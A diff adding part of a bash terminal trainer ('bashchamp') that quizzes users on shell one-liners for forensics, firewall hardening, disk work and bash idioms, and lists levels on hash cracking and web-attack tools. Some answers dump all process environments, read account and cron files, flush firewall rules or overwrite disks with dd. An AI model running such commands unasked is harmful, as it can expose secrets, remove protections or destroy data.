+  questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
+  questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
+  questions+=("List all users with shell access|grep -v '/nologin\\|/false' /etc/passwd")
+  questions+=("Show failed login attempts|journalctl _COMM=sshd | grep -i 'failed\\|invalid'|grep 'Failed' /var/log/auth.log")
+  questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
+  questions+=("Check for rootkits|chkrootkit|rkhunter --check")
+  questions+=("Dump all environment variables|env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
+  questions+=("Show all listening processes with full path|ss -tlpn | awk 'NR>1 {print \$6}' | sed 's/.*:\\([0-9]*\\).*/\\1/' | xargs -I{} lsof -i:{}")
+  questions+=("Find processes with deleted binaries|ls -la /proc/*/exe 2>/dev/null | grep deleted")
+  questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")
+
+  # === DEFENSIVE HARDENING ===
+  questions+=("Block IP with iptables|iptables -A INPUT -s ${ip} -j DROP")
+  questions+=("Block IP with nftables|nft add rule inet filter input ip saddr ${ip} drop")
+  questions+=("Rate limit SSH connections|iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT")
+  questions+=("Enable SYN cookies|echo 1 > /proc/sys/net/ipv4/tcp_syncookies")
+  questions+=("Disable IP forwarding|echo 0 > /proc/sys/net/ipv4/ip_forward")
+  questions+=("Flush all firewall rules|iptables -F; iptables -X")
+  questions+=("List all iptables rules|iptables -L -n -v")
+  questions+=("List all nftables rules|nft list ruleset")
+  questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
+  questions+=("Lock user account|passwd -l ${user}|usermod -L ${user}")
+
+  # === PROCESS NINJA ===
+  questions+=("List processes by memory usage|ps aux --sort=-%mem | head")
+  questions+=("Find process by open file|lsof ${txt}|fuser ${txt}")
+  questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
+  questions+=("Kill all processes by name|pkill -9 -f pattern")
+  questions+=("Nice a running process|renice -n 10 -p PID")
+
+  # === DISK SURVIVAL ===
+  questions+=("Find disk usage hogs|du -xh / 2>/dev/null | sort -rh | head -20")
+  questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
+  questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
+  questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
+  questions+=("Secure wipe file|shred -vfz -n 3 ${txt}")
+  questions+=("Create RAM disk|mount -t tmpfs -o size=512M tmpfs /mnt/ramdisk")
+  questions+=("Clone disk with progress|dd if=/dev/sda of=/dev/sdb bs=64K status=progress conv=noerror,sync")
+
+  # === PURE BASH MAGIC ===
+  questions+=("Random string generator|tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32")
+  questions+=("Timestamp in epoch|date +%s")
+  questions+=("Convert epoch to date|date -d @1234567890")
+  questions+=("Parallel execution with xargs|cat urls.txt | xargs -P 10 -I{} curl -s {}")
+  questions+=("Timeout a command|timeout 5 long_running_cmd")
+  questions+=("Retry command until success|until cmd; do sleep 1; done")
+  questions+=("Lock file to prevent concurrent runs|exec 200>/tmp/lock; flock -n 200 || exit 1")
+  questions+=("Named pipe (FIFO)|mkfifo /tmp/pipe; cmd1 > /tmp/pipe & cmd2 < /tmp/pipe")
+
+  # === OFFLINE/AIR-GAPPED ===
+  questions+=("Create bootable USB|dd if=arch.iso of=/dev/sdb bs=4M status=progress oflag=sync")
+  questions+=("Generate SSH key (no network needed)|ssh-keygen -t ed25519 -f ~/.ssh/offline_key")
+  questions+=("Encrypt file for offline transport|gpg -c --cipher-algo AES256 ${txt}")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# QUESTION SYSTEM - Generate and manage questions per level
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Level descriptions
+declare -A LEVEL_DESC=(
+  [0]="Shell Fundamentals: redirects, pipes, jobs, history, variables, expansion, tests"
+  [1]="Core Tools: cat, ls, head, tail, tar, ln, chmod, wc, du"
+  [2]="Text Search: grep, ripgrep, regex patterns"
+  [3]="File Finding: find, fd, by name/size/time/type"
+  [4]="Data Processing: sort, uniq, cut, awk, ps, ss, ip"
+  [5]="String & Arrays: parameter expansion, arrays, manipulation"
+  [6]="Control Flow: if/else, loops, case, functions, traps"
+  [7]="Batch Ops: find -exec, xargs, sed, systemctl, journalctl"
+  [8]="Network Scanning: nmap, service detection, scripts"
+  [9]="Hash Cracking: hashcat, john, hydra, encoding"
+  [10]="Forensics: strings, binwalk, volatility, disk imaging"
+  [11]="Network Tools: tshark, curl, wget, ssh tunnels, openssl"
+  [12]="Web Attack: nikto, sqlmap, feroxbuster, wifi, smb, netcat"
+  [13]="Apocalypse Mode: one-liners, recovery, hardcore combos"
+)
+
+# Generate questions for a level (called once per level attempt)
+declare -a CURRENT_QUESTIONS=()
+generate_level() {
+  local level=$1
+  CURRENT_QUESTIONS=()
+  local raw
+  case $level in
+    0) raw=$(gen_q0);; 1) raw=$(gen_q1);; 2) raw=$(gen_q2);; 3) raw=$(gen_q3);;
+    4) raw=$(gen_q4);; 5) raw=$(gen_q5_strings);; 6) raw=$(gen_q6_controlflow);; 7) raw=$(gen_q7_batch);;
+    8) raw=$(gen_q8_nmap);; 9) raw=$(gen_q9_hash);; 10) raw=$(gen_q10_forensics);; 11) raw=$(gen_q11_network);;
+    12) raw=$(gen_q12_webattack);; 13) raw=$(gen_q13);;
+  esac
+  while IFS= read -r line; do
+    [[ -n "$line" ]] && CURRENT_QUESTIONS+=("$line")
+  done <<< "$raw"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CORE ENGINE (mostly unchanged from original)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Normalize flags: -la == -al == -a -l
+norm() {
+  local parts flags=() args=() out p
+  read -ra parts <<< "$1"; out="${parts[0]}"
+  for p in "${parts[@]:1}"; do
+    if [[ "$p" == -* ]]; then
+      [[ "$p" =~ ^-[a-zA-Z]+$ && ${#p} -gt 2 ]] && { for ((j=1;j<${#p};j++)); do flags+=("-${p:j:1}"); done; } || flags+=("$p")
+    else args+=("$p"); fi
+  done
+  readarray -t flags < <(printf '%s\n' "${flags[@]}"|LC_ALL=C sort)
+  printf '%s' "$out"; printf ' %s' "${flags[@]}" "${args[@]}"; echo
+}
+
+check() {
+  local inp="${1#"${1%%[![:space:]]*}"}" a b; inp="${inp%"${inp##*[![:space:]]}"}"
+  IFS='|' read -ra opts <<< "$2"
+  for a in "${opts[@]}"; do b="${a#"${a%%[![:space:]]*}"}"; b="${b%"${b##*[![:space:]]}"}"; [[ "$inp" == "$b" || "$(norm "$inp")" == "$(norm "$b")" ]] && return 0; done; return 1
+}
+
+LVL=0 QI=0 HINT=false PROG=0 TOT=0
+load() { [[ -f "$DATA/session.json" ]] && { local t; t=$(<"$DATA/session.json"); t="${t#*\"level\":}"; LVL="${t%%[!0-9]*}"; }; LVL=${LVL:-0}; [[ -f "$DATA/session.json" ]] && { local t; t=$(<"$DATA/session.json"); [[ "$t" == *'"qi":'* ]] && { t="${t#*\"qi\":}"; QI="${t%%[!0-9]*}"; }; }; QI=${QI:-0}; }
+save() { printf '{"level":%d,"qi":%d}\n' "$LVL" "$QI" > "$DATA/session.json"; }
+# Score tracking: tier 0=copy, 1=blank, 2=recall (md5 hash keys avoid regex issues)
+_hash() { local h; h=$(printf '%s' "$1"|md5sum); echo "${h:0:16}"; }
+score_set() { local k=$(_hash "$1"); sed -i "/^$k|/d" "$DATA/scores" 2>/dev/null; echo "$k|$2">>"$DATA/scores"; }
+score_get() { local k=$(_hash "$1") t; t=$(grep "^$k|" "$DATA/scores" 2>/dev/null); t="${t##*|}"; echo "${t:-0}"; }
+
+stats() {
+  local -A sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do sc[$k]=$v; done < "$DATA/scores"
+  echo -e "${B}Mastery Stats${N}"
+  echo -e "${D}Note: Questions are dynamically generated, stats show unique prompts seen${N}\n"
+  local total_seen=0 total_t0=0 total_t1=0 total_t2=0
+  for k in "${!sc[@]}"; do
+    case "${sc[$k]}" in 0) ((++total_t0));; 1) ((++total_t1));; *) ((++total_t2));; esac
+    ((++total_seen))
+  done
+  echo -e "Total unique prompts practiced: ${B}${total_seen}${N}"
+  printf "${R}%3d${N} copy (tier 0)   ${Y}%3d${N} blank (tier 1)   ${G}%3d${N} recall (tier 2)\n" "$total_t0" "$total_t1" "$total_t2"
+  echo
+  echo -e "${B}Level Descriptions:${N}"
+  for lv in {0..13}; do
+    printf "  ${C}%2d${N}: ${LEVEL_DESC[$lv]}\n" "$lv"
+  done
+}
+
+# Tier display: 0=copy, 1=blank, 2=recall
+show_tier() {
+  local tier=$1 ans=$2
+  case $tier in
+    0) echo -e "${C}Type:${N} ${ans}";;
+    1) local half=$((${#ans}/2)); echo -e "${C}Complete:${N} ${ans:0:half}${D}...${N}";;
+  esac
+}
+
+input="" cursor=0 mode="insert" SHOW_HINT=0 UNDO="" EXPLAIN_LINES=0 _rep=""
+clear_hint() { for ((i=0;i<=EXPLAIN_LINES;i++)); do printf '\e[A\e[2K'; done; printf '\r'; }
+hdr() { printf '\e[2J\e[H'; echo -e "${B}=== Level $1 ===${N}  ${D}${LEVEL_DESC[$1]}${N}"; echo -e "${D}[$2/$3]  Tab=hint Ctrl+n=skip${N}\n"; }
+qdisp() { bar; echo -e "\n${D}$1${N}"; show_tier "$2" "$3"; echo; }
+bar() { local f e; printf -v f '%*s' "$PROG" ''; printf -v e '%*s' "$((TOT-PROG))" ''; printf '[%s%s]' "${f// /█}" "${e// /░}"; }
+draw() {
+  echo -ne "\r\e[K"
+  if ((SHOW_HINT)); then
+    echo -ne "${D}$PROMPT_CHAR${ans}${N}"
+  else
+    ((VI_MODE)) && [[ $mode != insert ]] && echo -ne "\e[91m$PROMPT_CHAR\e[0m" || echo -ne "\e[97m$PROMPT_CHAR\e[0m"
+    echo -n "$input"
+    ((cursor<${#input})) && echo -ne "\e[$((${#input}-cursor))D"
+  fi
+}
+
+# Vi helpers
+_wfwd() { while ((cursor<${#input})) && [[ "${input:cursor:1}" != " " ]]; do ((++cursor)); done; while ((cursor<${#input})) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; ((cursor>=${#input}&&${#input}>0)) && cursor=$((${#input}-1)); }
+_wbck() { ((cursor>0)) && ((cursor--)); while ((cursor>0)) && [[ "${input:cursor:1}" == " " ]]; do ((cursor--)); done; while ((cursor>0)) && [[ "${input:cursor-1:1}" != " " ]]; do ((cursor--)); done; }
+_wend() { ((cursor<${#input}-1)) && ((++cursor)); while ((cursor<${#input}-1)) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; while ((cursor<${#input}-1)) && [[ "${input:cursor+1:1}" != " " ]]; do ((++cursor)); done; }
+_clamp() { ((cursor>=${#input}&&cursor>0)) && cursor=$((${#input}-1)); }
+_del() { # $1=motion
+  local e=$cursor
+  case "$1" in
+    d|c) input="" cursor=0;;
+    w) while ((e<${#input})) && [[ "${input:e:1}" != " " ]]; do ((++e)); done; input="${input:0:cursor}${input:e}";;
+    b) ((e>0)) && ((e--)); while ((e>0)) && [[ "${input:e:1}" == " " ]]; do ((e--)); done; while ((e>0)) && [[ "${input:e-1:1}" != " " ]]; do ((e--)); done; input="${input:0:e}${input:cursor}"; cursor=$e;;
+    \$) input="${input:0:cursor}";;
+    0) input="${input:cursor}"; cursor=0;;
+  esac; _clamp
+}
+
+run() {
+  local lv=$1 shuf=() qi=${QI:-0} done=0
+  generate_level "$lv"  # Generate fresh questions for this level
+  local -A _sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do _sc[$k]=$v; done < "$DATA/scores"
+  _sget() { local h=$(_hash "$1"); echo "${_sc[$h]:-0}"; }
+  _sset() { local h=$(_hash "$1"); _sc[$h]=$2; sed -i "/^$h|/d" "$DATA/scores" 2>/dev/null; echo "$h|$2">>"$DATA/scores"; }
+  TOT=${#CURRENT_QUESTIONS[@]}; PROG=$qi
+  # Prioritize by tier: 0 (copy) > 1 (blank) > 2 (recall)
+  local t0=() t1=() t2=()
+  for q in "${CURRENT_QUESTIONS[@]}"; do
+    case "$(_sget "${q%%|*}")" in 0) t0+=("$q");; 1) t1+=("$q");; *) t2+=("$q");; esac
+  done
+  readarray -t shuf < <({ printf '%s\n' "${t0[@]}"|shuf; printf '%s\n' "${t1[@]}"|shuf; printf '%s\n' "${t2[@]}"|shuf; })
+  hdr "$lv" "$((qi+1))" "$TOT"
+  while ((qi < ${#shuf[@]})); do
+    local prompt="${shuf[$qi]%%|*}" answers="${shuf[$qi]#*|}"; local ans="${answers%%|*}"
+    local tier; tier=$(_sget "$prompt")
+    HINT=false SHOW_HINT=0 EXPLAIN_LINES=0
+    qdisp "$prompt" "$tier" "$ans"
+    while true; do
+      input="" cursor=0 mode="insert" SHOW_HINT=0
+      read -t 0.01 -rsn 1000 ||:
+      draw
+      while IFS= read -rsn1 c; do
+        if [[ "$c" == $'\t' ]]; then
+          # Toggle hint + explanation
+          if ((SHOW_HINT)); then
+            SHOW_HINT=0; clear_hint
+          else
+            SHOW_HINT=1; HINT=true; draw; echo; explain "$ans"; continue
+          fi
+          draw; continue
+        fi
+        if [[ "$mode" == "insert" ]]; then
+          # Clear hint display if typing
+          if ((SHOW_HINT)) && [[ "$c" != $'\x1b' && "$c" != '' ]]; then
+            SHOW_HINT=0; clear_hint
+          fi
+          case "$c" in
+            $'\x0e') echo -e "\n${D}[skipped]${N}"; ((++qi)); break 2;;  # Ctrl+N skip
+            $'\x04') echo -e "\n${D}[quit]${N}"; exit 0;;  # Ctrl+D quit
+            $'\x1b') ((VI_MODE)) && { mode="normal"; ((cursor>0)) && ((cursor--)); draw; };;
+            $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; };;
+            '') echo; break;;
+            *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw;;
+          esac
+        elif ((VI_MODE)); then
+          # Clear hint display if any vi command
+          if ((SHOW_HINT)); then SHOW_HINT=0; clear_hint; fi
+          # Number prefix: accumulate digits
+          if [[ "$c" =~ ^[1-9]$ ]] || { [[ "$c" == "0" ]] && [[ -n "$_rep" ]]; }; then _rep+="$c"; continue; fi
+          local _n=${_rep:-1}; _rep=""
+          # Save for undo before destructive operations
+          case "$c" in s|S|x|X|D|C|d|c|r) UNDO="$input:$cursor";; esac
+          case "$c" in
+            i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
+            A) mode="insert"; cursor=${#input}; draw;; I) mode="insert"; cursor=0; draw;;
+            s) ((${#input}>0)) && input="${input:0:cursor}${input:cursor+1}"; mode="insert"; draw;;
+            S) input="" cursor=0 mode="insert"; draw;;
+            h) for ((_i=0;_i<_n&&cursor>0;_i++)); do ((cursor--)); done; draw;;
+            l) for ((_i=0;_i<_n&&cursor<${#input}-1;_i++)); do ((++cursor)); done; draw;;
+            0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
+            w) for ((_i=0;_i<_n;_i++)); do _wfwd; done; draw;;
+            b) for ((_i=0;_i<_n;_i++)); do _wbck; done; draw;;
+            e) for ((_i=0;_i<_n;_i++)); do _wend; done; draw;;
+            f) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
+            F) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
+            t) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p-1)); break; }; done; done; draw;;
+            T) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p+1)); break; }; done; done; draw;;
+            x) for ((_i=0;_i<_n&&${#input}>0&&cursor<${#input};_i++)); do input="${input:0:cursor}${input:cursor+1}"; done; _clamp; draw;;
+            X) for ((_i=0;_i<_n&&cursor>0;_i++)); do input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); done; draw;;
+            D) input="${input:0:cursor}"; ((cursor>0)) && ((cursor--)); draw;;
+            C) input="${input:0:cursor}"; mode="insert"; draw;;
+            r) IFS= read -rsn1 c2; [[ -n "$c2" && "$c2" != $'\x1b' ]] && { input="${input:0:cursor}${c2}${input:cursor+1}"; draw; };;
+            d) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; draw;;
+            c) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; mode="insert"; draw;;
+            u) [[ -n "$UNDO" ]] && { input="${UNDO%:*}"; cursor="${UNDO#*:}"; UNDO=""; draw; };;  # undo
+            n) echo -e "\n${D}[skipped]${N}"; ((++qi)); break 2;;  # skip in normal mode
+            q) echo -e "\n${D}[quit]${N}"; exit 0;;  # quit
+            \?) echo -e "\n${D}hjkl${N} move  ${D}wb${N} word  ${D}fFtT${N}+char find  ${D}0\$${N} line"; echo -e "${D}x/X${N} del char  ${D}dw/db/dd${N} del  ${D}cw/cb/cc${N} change  ${D}r${N} replace"; echo -e "${D}s/S${N} subst  ${D}i/a/I/A${N} insert  ${D}u${N} undo  ${D}n${N} skip  ${D}q${N} quit"; echo -e "${D}Tab${N} hint  ${D}Ctrl+n${N} skip  ${D}Ctrl+d${N} quit  ${D}[num]cmd${N} repeat"; read -rsn1; hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"; draw;;
+            '') echo; break;;
+          esac
+        fi
+      done
+      if check "$input" "$answers"; then
+        ((++PROG))
+        if $HINT; then echo -e "${Y}+1${N} ${D}(hint)${N}"; _sset "$prompt" "$tier"  # stay same tier
+        else ((++done)); echo -e "${G}+1${N}"; _sset "$prompt" "$((tier<2?tier+1:2))"; fi  # tier++
+        ((++qi)); QI=$qi; save; break
+      else
+        ((PROG>0)) && ((PROG--)); echo -e "${R}-1${N}\n${D}answer:${N} ${C}${ans}${N}"
+        _sset "$prompt" "$((tier>0?tier-1:0))"; sleep 2  # tier--
+      fi
+      tier=$(_sget "$prompt"); hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"
+    done
+    hdr "$lv" "$((qi+1))" "$TOT"
+  done
+  if ((done>=TOT)); then
+    echo -e "${G}${B}Level $lv Complete!${N}"
+    ((lv<13)) && { echo "Enter for Level $((lv+1))..."; read -r; LVL=$((lv+1)); QI=0; save; run "$LVL"; } || echo -e "${G}${B}ALL COMPLETE - APOCALYPSE BASH GOD${N}"
+  else echo -e "${Y}Need $((TOT-done)) more without hints${N}"; echo "Enter to retry..."; read -r; QI=0; save; run "$lv"; fi
+}
+
+case "${1:-}" in
+  [0-9]|1[0-3]) _tty; LVL=$1; QI=0; save; run "$LVL";;
+  r|reset) rm -f "$DATA"/*.json "$DATA/vi_mode" "$DATA/scores"; echo "Reset.";;
+  s|stats) stats;;
+  v|version|-v|--version) echo "bashchamp v2.0 - Apocalypse Edition";;
+  h|help|-h|--help)
+    echo -e "${B}bashchamp${N} - CLI command trainer with dynamic questions"
+    echo -e "${D}Apocalypse Edition - 14 levels, 550+ questions${N}"
+    echo
+    echo "Usage: bashchamp [level|command]"
+    echo
+    echo "Commands:"
+    echo "  0-13     Start specific level"
+    echo "  n|new    Start fresh from level 0"
+    echo "  s|stats  Show mastery statistics"
+    echo "  r|reset  Reset all progress"
+    echo "  h|help   Show this help"
+    echo
+    echo "Controls:"
+    echo "  Tab      Toggle hint + explanations"
+    echo "  Ctrl+n   Skip question"
+    echo "  Ctrl+d   Quit"
+    echo "  ?        Show vi keybindings (in vi mode)"
+    echo
+    echo "Levels:"
+    for lv in {0..13}; do
+      echo "  ${lv} - ${LEVEL_DESC[$lv]}"
+    done
+    ;;
+  n|new) _tty; LVL=0; QI=0; save; run "$LVL";;
+  "") _tty; load; ((LVL>0||QI>0)) && { read -rp "Continue Level $LVL Q$((QI+1))? [Y/n] " yn; [[ "$yn" =~ ^[Nn] ]] && { LVL=0; QI=0; save; }; }; run "$LVL";;
+  *) echo "Usage: bashchamp [0-13|reset|stats|help|version]"; exit 1;;
+esac
